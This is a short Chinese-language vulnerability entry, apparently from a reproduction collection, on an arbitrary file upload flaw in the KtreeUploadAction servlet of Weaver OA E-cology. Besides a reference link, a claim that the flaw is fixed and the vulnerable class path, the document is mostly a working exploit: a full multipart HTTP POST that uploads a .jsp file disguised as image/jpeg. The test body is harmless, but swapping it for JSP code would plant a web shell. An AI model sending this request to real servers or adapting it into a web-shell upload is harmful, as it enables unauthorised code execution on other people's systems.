# 泛微OA E-cology KtreeUploadAction 任意文件上传

## 漏洞描述

参考链接：

- [泛微e-cology任意文件上传(已修复)](https://mp.weixin.qq.com/s?__biz=MzkxMzIzNTU5Mg==&mid=2247483666&idx=1&sn=e70efe98c064e0f1df986e2b65c1a608&chksm=c1018af5f67603e39ce4d6e9375875e63e7b80633a1f99959f8d4652193ac3734765a99099ea&mpshare=1&scene=23&srcid=0414cqXy50udQOy19LYOMega&sharer_sharetime=1618332600979&sharer_shareid=d15208c7b27f111e2fe465f389ab6fac#rd)

## 漏洞影响

```
目前已修复
```

## 漏洞复现

定位文件：

`ecology\CLASSB~1\com\weaver\formmodel\apps\ktree\servlet\KtreeUploadAction.class`

exp：

```

POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=--------1638451160
Content-Length: 171

----------1638451160
Content-Disposition: form-data; name="test"; filename="test.jsp"
Content-Type: image/jpeg

helloword
----------1638451160--
```

